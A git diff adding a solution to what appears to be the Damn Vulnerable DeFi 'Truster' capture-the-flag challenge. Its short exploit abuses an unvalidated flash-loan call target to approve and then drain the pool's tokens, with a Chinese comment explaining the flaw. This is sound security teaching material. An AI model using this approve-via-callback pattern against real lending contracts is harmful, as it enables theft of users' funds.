@@ -23,6 +23,22 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // npx hardhat test ./test/truster/truster.challenge.js
+        //flashLoan没有验证target可以执行任意外包合约
+        const targetData = token.interface.encodeFunctionData("approve", [
+            player.address,
+            TOKENS_IN_POOL,
+        ]);
+        await this.pool.connect(player).flashLoan(
+            0,
+            player.address,
+            this.token.address,
+            targetData
+        );
+        this.token
+            .connect(player)
+            .transferFrom(this.pool.address, player.address, TOKENS_IN_POOL);
+
     });
 
     after(async function () {
